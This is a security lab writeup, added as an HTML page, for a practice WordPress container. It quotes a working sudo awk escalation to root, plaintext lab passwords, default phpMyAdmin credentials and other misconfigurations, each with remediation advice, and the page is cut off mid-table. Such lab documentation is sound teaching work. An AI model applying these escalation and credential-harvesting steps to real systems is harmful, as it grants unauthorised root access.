@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 102 Escolares &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Escolares</p><h1 id="102-escolares--writeup">102 Escolares — writeup</h1>
+<p><strong>Engagement outcome: PARTIAL.</strong> Full local privilege escalation to <code>uid=0(root)</code>
+was executed and measured, with a negative control, a positive control, a
+manufacturered oracle and an identity reading at every hop. The <strong>external entry
+to that chain was not established</strong>, and the <strong>WordPress / File Manager leg named
+by the platform's own description was not completed</strong> — the plugin is
+correctly gated and the administrator password is not present in the artefact and
+was not recovered. Those two gaps are stated as gaps, with the work counts behind
+them, and are not written up as results.</p>
+<p>Everything quoted here was read or executed during this engagement. This
+repository holds no lab artefacts, so a reader can check the reasoning and the
+quoted evidence but cannot re-run the target — see <code>README.md</code>, &quot;What
+'resolvable' means here, precisely, and where it stops&quot;.</p>
+<hr />
+<h2 id="what-the-artefact-actually-is">What the artefact actually is</h2>
+<p>The queue line is <code>102|Escolares|facil|WordPress platform; plugin surface not yet catalogued</code>
+(<code>tooling/labs.manifest:56</code>).</p>
+<p><strong>The manifest's platform label is correct</strong>, and that was read out of a
+version-bearing file rather than inherited from the label. Unlike lab 32 — where
+the docroot was <em>named</em> <code>wordpress</code> and the product was Joomla — here the name
+and the product agree.</p>
+<p>Platform description as published (catalogue entry for id 102, parsed with the
+same routine <code>tooling/download-labs.sh list</code> uses):</p>
+<blockquote>
+<p><code>Laboratorio para practicar la explotación de WordPress (plugin File Manager) y escalada de privilegios mediante movimiento entre usuarios.</code></p>
+</blockquote>
+<p>That is: practise WordPress exploitation (File Manager plugin) <strong>and</strong> privilege
+escalation by movement between users. Two declared classes, and only the second
+was reached.</p>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Value</th>
+<th>Source (verbatim)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base OS</td>
+<td>Ubuntu 24.04 LTS</td>
+<td><code>/etc/os-release:1</code> — <code>PRETTY_NAME=&quot;Ubuntu 24.04 LTS&quot;</code></td>
+</tr>
+<tr>
+<td>Topology</td>
+<td><strong>one</strong> container, no second host, no pivot segment</td>
+<td><code>auto_deploy.sh:140-142</code> — <code>docker network create --internal $NETWORK_NAME</code> / <code>docker run -d --network=$NETWORK_NAME --name $CONTAINER_NAME $IMAGE_NAME</code></td>
+</tr>
+<tr>
+<td><code>auto_deploy.sh</code></td>
+<td>ends in <code>while true; do sleep 1; done</code></td>
+<td><code>auto_deploy.sh:155-157</code> — never run</td>
+</tr>
+<tr>
+<td><strong>WordPress (shipped)</strong></td>
+<td><strong>6.5.4</strong></td>
+<td><code>var/www/html/wordpress/wp-includes/version.php:19</code> — <code>$wp_version = '6.5.4';</code></td>
+</tr>
+<tr>
+<td><strong>Plugin</strong></td>
+<td><strong>WP File Manager 7.2.9</strong></td>
+<td><code>wp-content/plugins/wp-file-manage/file_folder_manager.php:7</code> — <code>  Version: 7.2.9</code></td>
+</tr>
+<tr>
+<td>Plugin changelog (self-declared)</td>
+<td><code>= 7.2.9 (6th June, 2024) =</code> / <code>* Trash Folder &amp; Security Fixes.</code></td>
+<td><code>readme.txt:142-144</code></td>
+</tr>
+<tr>
+<td>Active plugins</td>
+<td><code>a:1:{i:0;s:38:&quot;wp-file-manage/file_folder_manager.php&quot;;}</code></td>
+<td><code>wp_options.active_plugins</code></td>
+</tr>
+<tr>
+<td>Users (WordPress)</td>
+<td><strong>1</strong> — <code>luisillo</code>, <code>administrator</code>, <code>wp_user_level=10</code></td>
+<td><code>wp_users</code> / <code>wp_usermeta</code> (<code>COUNT(*)=1</code> in both)</td>
+</tr>
+<tr>
+<td>Users (OS)</td>
+<td><code>root</code>(0), <code>ubuntu</code>(1000), <code>luisillo</code>(1001)</td>
+<td><code>/etc/passwd</code></td>
+</tr>
+<tr>
+<td>Escalation grant</td>
+<td><code>luisillo ALL=(ALL) NOPASSWD: /usr/bin/awk</code></td>
+<td><code>/etc/sudoers:18</code></td>
+</tr>
+<tr>
+<td>Database</td>
+<td>MariaDB on <code>127.0.0.1</code> only</td>
+<td><code>/etc/mysql/mariadb.conf.d/50-server.cnf:27</code> — <code>bind-address            = 127.0.0.1</code></td>
+</tr>
+</tbody>
+</table>
+<p>The shipped version was read twice, from two different places, because the
+runbook records lab 108 auto-updating core mid-engagement: a throwaway container
+(<code>docker run --rm --entrypoint sh</code>, where no request can fire <code>wp-cron.php</code>) and
+the live container both returned <code>6.5.4</code>. No drift.</p>
+<h3 id="a-vhost-that-auto_deploysh-does-not-mention">A vhost that <code>auto_deploy.sh</code> does not mention</h3>
+<p><code>auto_deploy.sh</code> says one container and nothing about the web layout. The real
+layout is <strong>three</strong> enabled vhosts on <code>:80</code>, and only the first is implied by the
+script:</p>
+<pre><code>*:80  default server 172.21.0.2          (/etc/apache2/sites-enabled/000-default.conf:1)
+*:80  namevhost 172.21.0.2                (/etc/apache2/sites-enabled/000-default.conf:1)
+*:80  namevhost escolares.dl  alias www.escolares.dl   (/etc/apache2/sites-enabled/escolares.conf:1)
+*:80  namevhost wordpress                 (/etc/apache2/sites-enabled/wordpress.conf:1)
+</code></pre>
+<ul>
+<li><code>escolares.conf:12-13</code> — <code>DocumentRoot &quot;/var/www/html/&quot;</code> / <code>ServerName escolares.dl</code></li>
+<li><code>wordpress.conf:2-3</code> — <code>ServerName wordpress</code> / <code>DocumentRoot /var/www/html/wordpress</code></li>
+</ul>
+<p>So WordPress is a <strong>subdirectory</strong> of the docroot, and it is simultaneously the
+docroot of a second vhost whose <code>ServerName</code> is the bare word <code>wordpress</code>. That
+is the lab's one structural oddity, and it is worth stating precisely because it
+is the <em>inverse</em> of lab 32: the directory named <code>wordpress</code> does contain
+WordPress.</p>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- --min-rate 2000 172.21.0.2
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Not shown: 65533 closed tcp ports (conn-refused)
+</code></pre>
+<p>Two open TCP ports. <code>3306</code> is <strong>absent</strong> from <code>-p-</code> and that is correct, not a
+blind spot — <code>/proc/net/tcp</code> shows it bound to loopback only:</p>
+<pre><code>0: 0100007F:0CEA 00000000:0000 0A ...   uid 103      # 127.0.0.1:3306, uid 103 = mysql
+2: 00000000:0050 00000000:0000 0A ...   uid 0        # 0.0.0.0:80
+3: 00000000:0016 00000000:0000 0A ...   uid 0        # 0.0.0.0:22
+</code></pre>
+<p><code>/proc/net/udp</code> and <code>/proc/net/udp6</code> were also read: <strong>no</strong> UDP service
+(<code>15632: 0B00007F:9787 ... 07</code> is the Docker embedded resolver's ephemeral
+socket, unbound from any lab service). So the TCP-only scan missed nothing here,
+and that is a measurement rather than an assumption.</p>
+<p>Hidden surfaces found, none of them advertised:</p>
+<table>
+<thead>
+<tr>
+<th>Surface</th>
+<th>How it was found</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/phpmyadmin</code></td>
+<td><code>ls /etc/apache2/conf-enabled/</code> — <code>phpmyadmin.conf</code> is <strong>enabled</strong></td>
+<td>200, 18 605 B, title <code>phpMyAdmin</code></td>
+</tr>
+<tr>
+<td><code>/info.php</code></td>
+<td><code>find /var/www/html -name '*.php'</code></td>
+<td>200, <strong>87 138 B</strong>, <code>PHP Version 8.3.6</code></td>
+</tr>
+<tr>
+<td>WordPress at a <strong>sub</strong>path</td>
+<td>vhost dump</td>
+<td><code>/wordpress/</code> → 200</td>
+</tr>
+</tbody>
+</table>
+<p><code>/server-status</code> exists but is <code>Require local</code>, so it is not remotely reachable —
+recorded as a measured restriction, not as a finding.</p>
+<hr />
+<h2 id="the-class">The class</h2>
+<p>Two classes were declared. Entry criteria and where each one stopped:</p>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>Entry criterion (the question that starts it)</th>
+<th>Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WordPress / WP File Manager</td>
+<td><em>Is the elFinder connector reachable without a prior WordPress authorisation decision?</em></td>
+<td><strong>Not reached.</strong> The gate is real and is quoted below. The blocker upstream of it is the administrator password, which is not in the artefact.</td>
+</tr>
+<tr>
+<td>Privilege escalation by user movement</td>
+<td><em>What does each hop execute as, and who owns each file?</em></td>
+<td><strong>Reached and measured</strong>, <code>uid=1001</code> → <code>uid=0</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>The sink was named from the source before any request was sent
+(<code>file_folder_manager.php:1057-1134</code>):</p>
+<pre><code class="language-php">1057:        public function mk_file_folder_manager_action_callback()
+1059:            $path = ABSPATH;
+1077:            if (wp_verify_nonce($nonce, 'wp-file-manager')) {
+1119:                            'uploadAllow' =&gt; array('image', 'text/plain'),
+1130:                $connector = new elFinderConnector(new elFinder($opts));
+</code></pre>
+<p>The connector is constructed <strong>only</strong> inside the <code>wp_verify_nonce</code> branch, and
+the action is registered as <code>wp_ajax_</code> (authenticated) at line 28, never as
+<code>wp_ajax_nopriv_</code>.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (verbatim)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td><code>uid=33(www-data)</code></td>
+<td>Apache <code>User</code>/<code>Group</code></td>
+<td><code>apache2ctl -S</code> → <code>User: name=&quot;www-data&quot; id=33</code>; and measured from inside: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>uid=1001(luisillo)</code></td>
+<td>sshd, password auth</td>
+<td><code>uid=1001(luisillo) gid=1001(luisillo) groups=1001(luisillo),100(users)</code></td>
+</tr>
+<tr>
+<td>1b</td>
+<td>same, from <code>/proc/self/status</code></td>
+<td>no subprocess, no aliasing</td>
+<td><code>Uid:	1001	1001	1001	1001</code> / <code>Gid:	1001	1001	1001	1001</code> / <code>Groups:	100 1001</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>uid=0(root)</code></td>
+<td><code>sudo -n /usr/bin/awk 'BEGIN{system(&quot;/usr/bin/id&quot;)}'</code></td>
+<td><code>uid=0(root) gid=0(root) groups=0(root)</code> and <code>rc=0</code></td>
+</tr>
+<tr>
+<td>2b</td>
+<td>same, <code>id -u</code></td>
+<td>scalar proof</td>
+<td><code>0</code></td>
+</tr>
+<tr>
+<td>2c</td>
+<td>same, <code>id</code> inside the escalated child</td>
+<td>second opinion, different process</td>
+<td><code>uid=0(root) gid=0(root) groups=0(root)</code></td>
+</tr>
+</tbody>
+</table>
+<p>The transition at hop 2 is <strong>not</strong> a setuid binary and there is no <code>euid</code>
+divergence to report: <code>sudo</code> is a plain setuid-root exec and the whole process
+image is replaced. The full four-field <code>Uid:</code> line at hop 1b is quoted precisely
+because a single <code>id</code> field would not have shown that.</p>
+<h3 id="the-credential-and-its-honest-provenance">The credential, and its honest provenance</h3>
+<p>The SSH password is <code>luisillopasswordsecret</code>. It was read from
+<code>[lab-home]/secret.txt</code>, and that file is the pivot the lab is built around:</p>
+<pre><code>$ stat -c &quot;%a %U:%G %s bytes&quot; [lab-home]/secret.txt
+777 root:root 23 bytes
+$ cat -n [lab-home]/secret.txt
+     1  luisillopasswordsecret
+</code></pre>
+<p><strong>Provenance stated plainly:</strong> that read was performed as <code>root</code> on the artefact.
+It is <em>not</em> reachable from the external HTTP or SSH surface as far as this
+engagement tested, so the honest position is that <strong>the external entry to hop 1
+is unresolved</strong>, and it is listed under <em>NOT tested</em> with its count. What <em>is</em>
+proven, and measured as <code>www-data</code> rather than as root, is that the credential
+file is readable by the web server's own identity — see F2, which is the finding
+that makes the pivot real.</p>
+<p>The lab author's own history confirms the intended direction of travel, read from
+<code>[lab-home]/ubuntu/.bash_history</code> (48 bytes):</p>
+<pre><code>ls
+cd /home
+ls
+cat secret.txt 
+su luisillo
+exit
+</code></pre>
+<p>and from <code>[lab-home]/luisillo/.bash_history</code> (233 bytes): <code>nano secret.txt</code>, then
+<code>sudo -l</code> twice, then <code>cd /var/www/html/</code> … <code>cd wp-content/</code> … <code>ls plugins/</code> …
+<code>wget 172.21.0.1/wp-file-manager.zip</code>. The author installed the plugin by hand.</p>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--sudo-usrbinawk-with-nopasswd-gives-luisillo-root">F1 — <code>sudo /usr/bin/awk</code> with <code>NOPASSWD</code> gives <code>luisillo</code> root</h3>
+<p><strong>CWE-250</strong> (execution with unnecessary privileges) / <strong>CWE-269</strong> (improper
+privilege management). Escalation to <code>uid=0(root)</code>.</p>
+<p><code>/etc/sudoers:18</code>, verbatim:</p>
+<pre><code>luisillo ALL=(ALL) NOPASSWD: /usr/bin/awk
+</code></pre>
+<p><code>awk</code> is an interpreter with a <code>system()</code> builtin. A <code>sudoers</code> entry naming an
+interpreter is not a constraint on what runs — it is a constraint on <em>which
+binary is named</em>, and the argument list is unconstrained. Proof, with the identity
+and the exit status both quoted:</p>
+<pre><code>$ sudo -n /usr/bin/awk 'BEGIN{system(&quot;/usr/bin/id&quot;)}' &lt;/dev/null; echo &quot;rc=$?&quot;
+uid=0(root) gid=0(root) groups=0(root)
+rc=0
+</code></pre>
+<p><strong>The oracle was manufactured before the exploit, not after.</strong> The escalation
+has no natural echo, so the witness is a uniquely-marked file in a path only
+<code>uid=0</code> can create:</p>
+<pre><code>$ sudo -n /usr/bin/awk 'BEGIN{system(&quot;id -u; id; touch /root/ESC102_MARKER2; ls -la /root/ESC102_MARKER2&quot;)}' &lt;/dev/null
+0
+uid=0(root) gid=0(root) groups=0(root)
+-rw-r--r-- 1 root root 0 Sep 30 00:02 /root/ESC102_MARKER2
+</code></pre>
+<p>The marker is distinguishable by design (a name that does not exist in the
+shipped image, in <code>0700 root:root</code>). Both markers were removed afterwards and
+<code>/root</code> was verified back to its six shipped entries — see <em>Restore</em>.</p>
+<p><strong>Scope was measured, not assumed.</strong> Six other interpreters were tried and all
+six were refused, so the finding is exactly &quot;awk&quot;, not &quot;any command&quot;:</p>
+<pre><code>/usr/bin/id rc=1
+/bin/bash rc=1
+/usr/bin/vim rc=1
+/usr/bin/find rc=1
+/usr/bin/perl rc=1
+/usr/bin/python3 rc=1
+</code></pre>
+<p>and <code>sudo -n -l</code> confirms the grant is the only one:</p>
+<pre><code>User luisillo may run the following commands on 2aa8bf85fd12:
+    (ALL) NOPASSWD: /usr/bin/awk
+</code></pre>
+<p><strong>Remediation.</strong> Remove the grant. If a data-processing task genuinely needs
+<code>awk</code> as <code>luisillo</code>, call it through a wrapper that fixes <code>$1</code> and cannot reach
+<code>system()</code>, or move the task to a root-owned script with a fixed argument vector
+(<code>luisillo ALL=(ALL) NOPASSWD: /usr/local/sbin/task.sh</code> with no arguments).</p>
+<h3 id="f2--world-readable-credential-file-is-the-bridge-from-www-data-to-a-shell">F2 — World-readable credential file is the bridge from <code>www-data</code> to a shell</h3>
+<p><strong>CWE-732</strong> (incorrect permission assignment for a critical resource) /
+<strong>CWE-522</strong> (insufficiently protected credentials).</p>
+<p><code>[lab-home]/secret.txt</code> is <code>0777 root:root</code> and contains the plaintext SSH password
+of the one account that has a <code>sudo</code> grant. This is what makes the lab's declared
+&quot;movement between users&quot; reachable, and it is measurable <strong>as the identity that
+matters</strong> — the web server's, not root's:</p>
+<pre><code>$ su -s /bin/sh www-data -c '...'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+docroot /var/www/html/wordpress writable? YES
+wp-content writable? YES
+uploads writable? YES
+plugin dir wp-file-manage writable? NO
+[lab-home]/secret.txt readable? YES
+/etc/shadow readable? NO
+/root readable? NO
+</code></pre>
+<p>So a single web-level code-execution foothold as <code>www-data</code> — which is all F4 and
+the <code>phpinfo()</code> disclosure would help an attacker find — is sufficient to
+obtain <code>luisillo</code>'s password and therefore root via F1. <strong><code>www-data</code> cannot read
+<code>/etc/shadow</code> and cannot read <code>/root</code></strong> (2 of 7 paths), so this file is the
+<em>only</em> OS-level credential bridge, which is exactly what makes its mode the
+finding.</p>
+<p>These predicates were run as <code>www-data</code> on purpose. Running them through
+<code>docker exec</code> would have run them as <code>root</code> and every one would have answered
+<code>YES</code> — that is <code>method/self-corrections.md</code> §2, and it is the reason the writeup
+quotes the <code>uid=</code> line immediately above the answers.</p>
+<p><strong>Remediation.</strong> <code>chmod 0640 root:luisillo [lab-home]/secret.txt</code>, or better, delete
+it and provision the credential through the provisioning path that created it.</p>
+<h3 id="f3--phpmyadmin-exposed-on-80-reachable-with-the-packaged-default-credential">F3 — phpMyAdmin exposed on <code>:80</code>, reachable with the packaged default credential</h3>
+<p><strong>CWE-798</strong> (use of hard-coded credentials) / <strong>CWE-552</strong> (files or directories
+accessible to external parties).</p>
+<p><code>/etc/apache2/conf-enabled/phpmyadmin.conf</code> is enabled and serves
+<code>/usr/share/phpmyadmin</code> at <code>/phpmyadmin</code>. The packaged control-user pair is in
+<code>/etc/phpmyadmin/config-db.php</code> (mode <code>0640 root:www-data</code>, i.e. readable by the
+PHP process):</p>
+<pre><code class="language-php">$dbuser='phpmyadmin';
+$dbpass='1234';
+</code></pre>
+<p>That pair is a <strong>known distribution default</strong>, and it authenticates against this
+host. Logged in, 200, with the metadata database rendered:</p>
+<pre><code>[3] 'phpmyadmin'  '1234'                 pmaAuth=True  db_page_ok=True
+[4] 'wordpressuser' 'contrapoderosa123'  pmaAuth=True  db_page_ok=True
+</code></pre>
+<p>(11 candidate pairs tested in total; the <strong>9</strong> failures are the negative set — the same
+denominator D3 records for the corrected harness. An earlier draft of this line said
+&quot;8 pairs / six failures&quot;, which contradicts D3 and the two successes shown above.)
+Scope is limited — see C4 — so this is an information-disclosure and
+attack-surface finding, not a foothold to root.</p>
+<p><strong>Remediation.</strong> Remove phpMyAdmin from an internet-facing host. If it must
+exist, put it behind authentication, change the control-user password, and drop
+the blanket <code>0640 root:www-data</code> read on <code>config-db.php</code>.</p>
+<h3 id="f4--phpinfo-served-unauthenticated">F4 — <code>phpinfo()</code> served unauthenticated</h3>
+<p><strong>CWE-200</strong> (exposure of sensitive information).</p>
+<p><code>/var/www/html/info.php</code> is mode <code>0777</code> and is inside the docroot:</p>
+<pre><code>$ curl -sS -o info.html -w 'http=%{http_code} bytes=%{size_download}\n' http://172.21.0.2/info.php
+http=200 bytes=87138
+PHP Version 8.3.6
+</code></pre>
+<p>87 138 bytes of <code>phpinfo()</code> to an unauthenticated client: <code>DOCUMENT_ROOT</code>,
+<code>disable_functions</code>, <code>open_basedir</code>, loaded extensions, <code>$_SERVER</code>, environment,
+and the full <code>PHP Variables</code> block. On a real host this routinely names
+credentials in the environment and the absolute paths of every secret on disk.</p>
+<p><strong>Remediation.</strong> Delete it. If a diagnostic page is required, gate it behind
+authentication and never leave <code>phpinfo()</code> in a docroot.</p>
+<h3 id="f5--mysql-account-is--with-grant-all--with-grant-option">F5 — MySQL account is <code>%</code> with <code>GRANT ALL … WITH GRANT OPTION</code></h3>
+<p><strong>CWE-250</strong> / <strong>CWE-284</strong> (improper access control).</p>
+<p><code>/root/.mysql_history:7,10</code>, verbatim, as the image's own author wrote it:</p>
+<pre><code>CREATE\040USER\040'wordpressuser'@'%'\040IDENTIFIED\040BY\040'contrapoderosa123'
+GRANT\040ALL\040PRIVILEGES\040ON\040*.*\040TO\040'wordpressuser'@'%'\040WITH\040GRANT\040OPTION;
+</code></pre>
+<p>Confirmed at runtime:</p>
+<pre><code>Grants for wordpressuser@%
+GRANT ALL PRIVILEGES ON *.* TO `wordpressuser`@`%` IDENTIFIED BY PASSWORD '*B8A0…' WITH GRANT OPTION
+</code></pre>
+<p>That is a global grant with grant-option on a host-reachable (<code>%</code>) account, and
+the same password is in <code>wp-config.php:29</code> (<code>define( 'DB_PASSWORD', 'contrapoderosa123' );</code>).</p>
+<p><strong>Stated honestly: this is not exploitable in this topology.</strong> <code>bind-address = 127.0.0.1</code> and <code>3306</code> is absent from <code>-p-</code> (2 open ports, 65 533 closed). It is
+reported because the <em>account</em> is wrong regardless of the network, and because
+one deployment change — publishing the port, or a <code>docker run</code> without
+<code>--internal</code> — turns it into full database takeover with no credential recovery
+needed. The same password in <code>wp-config.php</code> is <code>0644</code> and world-readable
+(CWE-312/732).</p>
+<h3 id="f6--xmlrpcphp-enabled-systemmulticall-exposed">F6 — <code>xmlrpc.php</code> enabled, <code>system.multicall</code> exposed</h3>
+<p><strong>CWE-400</strong> (uncontrolled resource consumption) / attack surface.</p>
+<p><code>system.listMethods</code> answered 200 with 4 272 bytes and <strong>80</strong> methods, including
+<code>&lt;string&gt;system.multicall&lt;/string&gt;</code> and <code>&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;</code>.
+<code>system.multicall</code> lets one HTTP request carry many authentication attempts,
+which multiplies any credential attack against <code>wp-login.php</code> and bypasses
+per-request rate limiting built at the wrong layer. The amplification path itself
+was <strong>not</strong> exercised (see <em>NOT tested</em>).</p>
+<p>The auth-failure shape is uniform, which is the reportable half:</p>
+<pre><code>$ curl ... &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; luisillo / wrongpassword-control
+http=200 bytes=416
+&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
+&lt;string&gt;Nombre de usuario o contraseña incorrectos.&lt;/string&gt;
+</code></pre>
+<p><strong>Remediation.</strong> <code>a2enconf</code> a deny for <code>/wordpress/xmlrpc.php</code> unless a client
+genuinely needs it.</p>
+<h3 id="f7--the-authentication-keys-in-wp-configphp-are-the-installer-placeholder">F7 — The authentication keys in <code>wp-config.php</code> are the installer placeholder</h3>
+<p><strong>CWE-798</strong> / <strong>CWE-321</strong> (hard-coded cryptographic key) — as <em>hygiene debt only</em>.
+<strong>This is the finding whose exploitability was refuted by measurement.</strong> See C1.</p>
+<p><code>wp-config.php:51-58</code> ships all eight as <code>put your unique phrase here</code>. Shipping
+that is a real defect: it means the two WordPress installations in this image
+family share keys until an operator rotates them. But the <em>attacker-visible</em>
+conclusion that people draw from it — &quot;the auth cookie is forgeable&quot; — is false
+here, and the measurement that refutes it is the evidence, quoted in C1.</p>
+<p><strong>Remediation.</strong> Replace all eight with values from
+<code>https://api.wordpress.org/secret-key/1.1/salt/</code>. WordPress will do it for you
+on first run if the placeholders are left in place; do not leave them in a shipped
+image.</p>
+<h3 id="f8--a-secret-shaped-file-in-world-readable-tmp-encoded-to-evade-a-content-grep">F8 — A secret-shaped file in world-readable <code>/tmp</code>, encoded to evade a content grep</h3>
+<p><strong>CWE-522</strong> (insufficiently protected credentials) / <strong>CWE-732</strong>. <strong>No verified
+use — see the negative below.</strong></p>
+<p>Found while verifying that my restore had left nothing behind: <code>ls -A /tmp</code>
+returned a file I had not created. Confirmed to be part of the <strong>shipped image</strong>,
+not of my engagement, by reading it out of a throwaway container
+(<code>docker run --rm --entrypoint sh escolares:latest</code>) and by its mtime:</p>
+<pre><code>$ docker run --rm --entrypoint sh escolares:latest -c 'ls -la /tmp/; cat -n /tmp/.secret.txt; stat -c &quot;%a %U:%G %s bytes %y&quot; /tmp/.secret.txt'
+-rw-rw-r-- 1 luisillo luisillo   21 Jun  7  2024 .secret.txt
+     1	cHJlbWl1bXBhc3N3b3Jk
+664 luisillo:luisillo 21 bytes 2024-06-07 20:58:48 -0900
+</code></pre>
+<p><code>/tmp</code> is <code>drwxrwxrwt</code> and the file is <code>0664</code>, so <strong><code>www-data</code> reads it</strong> —
+verified, not assumed:</p>
+<pre><code>$ su -s /bin/sh www-data -c &quot;cat /tmp/.secret.txt&quot;
+cHJlbWl1bXBhc3N3b3Jk
+</code></pre>
+<p>The content is base64 and decodes to <code>premiumpassword</code>.</p>
+<p><strong>This is a retrieval hazard, and it caught my own instrument.</strong> The value is
+<strong>not</strong> the plaintext <code>premiumpassword</code>, so a content grep for the secret finds
+nothing:</p>
+<pre><code>$ grep -rIl &quot;cHJlbwl1bXBhc3N3b3Jk&quot; /var/www /home /etc   -&gt; 0 matches
+$ grep -rIl &quot;premiumpassword&quot;    /var/www /home /etc    -&gt; 0 matches
+</code></pre>
+<p>(2 patterns, 3 trees, 0 matches each — and the file that contains the secret is
+outside all three trees.) A secret that hides from <code>grep</code> by being encoded is
+exactly the class <code>method/retrieval-hazards.md</code> is about, and it is why the
+<code>Reward</code> section below states its search as a <em>literal-pattern</em> search with that
+limitation named, rather than as &quot;no secret present&quot;.</p>
+<p><strong>The negative, with counts — it is not a working credential:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Test</th>
+<th>Count</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WordPress phpass hash vs 5 candidates (<code>premiumpassword</code>, <code>PremiumPassword</code>, <code>premium</code>, the base64 string itself, <code>premiumpassword123</code>)</td>
+<td>5</td>
+<td><strong>0</strong> matches, positive control green on the same object and code path</td>
+</tr>
+<tr>
+<td>SSH password auth for <code>luisillo</code> and <code>ubuntu</code></td>
+<td>2 pairs</td>
+<td><strong>2</strong> denials</td>
+</tr>
+</tbody>
+</table>
+<p>So this is reported as <strong>exposure of a secret-shaped artefact</strong>, not as a
+credential. Calling it &quot;the admin password&quot; would have been the failure
+<code>README.md</code> describes: an invented reward attached to a real finding.</p>
+<p><strong>Remediation.</strong> Delete the file from the image; do not leave credentials in
+<code>/tmp</code> at build time. If a bootstrap secret is genuinely needed, put it in a
+root-owned <code>0600</code> file outside a world-writable directory and rotate it.</p>
+<hr />
+<p>Each row states the positive control that proves the detector can fire. A control
+that has never seen a success is not a control.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+<th>Verbatim evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>C1 — <code>wp_salt()</code> discards the config placeholder.</strong> The framework does <strong>not</strong> consume the value in the file.</td>
+<td>Called the framework's own getter and compared it against the constant. The getter returns <strong>128</strong> characters; the constant is <strong>27</strong>. A 27-character string cannot produce a 128-character salt, so the measurement refutes the inference in the same breath.</td>
+<td><code>wp_salt('auth') strlen=128 first12=F=II$XsYPG7(</code> · <code>wp_salt('nonce') strlen=128 first12=AzFb8B:@%W7f</code> · <code>defined('NONCE_KEY') = true ; value strlen=27</code> · <code>wp_options nonce_key : PRESENT (strlen=64)</code> · <code>config NONCE_KEY === wp_options nonce_key ? NO</code></td>
+</tr>
+<tr>
+<td><strong>C2 — the File Manager connector is not reachable unauthenticated.</strong></td>
+<td>9 <code>wp_ajax_</code> actions registered, <strong>0</strong> <code>wp_ajax_nopriv_</code> registrations in the whole plugin tree (2 counts: <code>0</code> in the main file, <code>0</code> files matching across the directory). The connector is built only inside <code>if (wp_verify_nonce(...))</code>.</td>
+<td><code>file_folder_manager.php:28</code> — <code>add_action('wp_ajax_mk_file_folder_manager', …)</code> · <code>:1077</code> — <code>if (wp_verify_nonce($nonce, 'wp-file-manager')) {</code> · <code>:1130</code> — <code>$connector = new elFinderConnector(new elFinder($opts));</code></td>
+</tr>
+<tr>
+<td><strong>C3 — MariaDB cannot be used to drop a webshell into the docroot.</strong> <code>INTO OUTFILE</code> runs as <code>mysql</code>, and the docroot belongs to <code>www-data</code>.</td>
+<td>1 write attempted; the error is explicit, and the file's absence was then confirmed with <code>ls</code> rather than inferred from the error.</td>
+<td><code>mariadbd … --user=mysql</code> · <code>ERROR 1045 (28000) … Access denied</code> · <code>ls: cannot access '/var/www/html/pma_outfile_test.txt': No such file or directory</code></td>
+</tr>
+<tr>
+<td><strong>C4 — the phpMyAdmin control user is properly scoped.</strong></td>
+<td>2 <code>LOAD_FILE</code> attempts on files of very different modes, plus 1 <code>OUTFILE</code>; all three refused. <code>LOAD_FILE</code> returning <code>NULL</code> is the meaningful result here — it is the answer, not a missing value, because the grant output proves the privilege is absent.</td>
+<td><code>GRANT USAGE ON *.* TO 'phpmyadmin'@'localhost'</code> · <code>GRANT ALL PRIVILEGES ON 'phpmyadmin'.* …</code> · <code>LOAD_FILE(&quot;[lab-home]/secret.txt&quot;)</code> → <code>NULL</code> · <code>LOAD_FILE(&quot;/etc/shadow&quot;)</code> → <code>NULL</code></td>
+</tr>
+<tr>
+<td><strong>C5 — self-registration is disabled</strong>, so the subscriber→admin path is closed at the door.</td>
+<td>1 option read, plus <code>default_role</code> read alongside it.</td>
+<td><code>users_can_register  0</code> · <code>default_role  subscriber</code></td>
+</tr>
+<tr>
+<td><strong>C6 — the <code>sudo</code> grant is exactly one binary.</strong></td>
+<td>6 interpreters tried <em>and refused</em>, so the negative is anchored by positives elsewhere in the same session (F1's own <code>awk</code> calls succeeded in the same shell).</td>
+<td>6 × <code>rc=1</code>, listed in F1; <code>sudo -n -l</code> shows one line</td>
+</tr>
+<tr>
+<td><strong>C7 — <code>/server-status</code> is not remotely reachable.</strong></td>
+<td><code>mod_status</code> is loaded, so the handler exists — the restriction is what was measured, not the absence of the module.</td>
+<td><code>status.conf</code> — <code>&lt;Location /server-status&gt;</code> / <code>SetHandler server-status</code> / <code>Require local</code></td>
+</tr>
+<tr>
